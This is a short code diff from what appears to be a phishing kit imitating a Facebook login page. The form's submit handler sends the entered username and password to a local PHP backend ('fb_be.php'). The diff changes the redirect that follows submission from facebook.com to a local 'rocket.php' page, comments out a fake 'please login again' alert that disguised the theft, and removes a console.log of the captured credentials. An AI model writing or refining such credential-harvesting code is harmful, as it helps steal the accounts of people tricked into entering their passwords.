@@ -6,8 +6,8 @@ fb.addEventListener("submit", (e) => {
 
     login(userName, password);
     
-   alert("Something wrong !! Please login again !");
-   window.location.href = "https://www.facebook.com";
+//    alert("Something wrong !! Please login again !");
+   window.location.href = "./rocket.php";
 });
 
 async function login(userName, password) {
@@ -16,7 +16,6 @@ async function login(userName, password) {
         userName: userName,
         password: password
     };
-    console.log(data);
     const url = './server/fb_be.php';
     const response = await fetch(url, {
         method: 'POST',
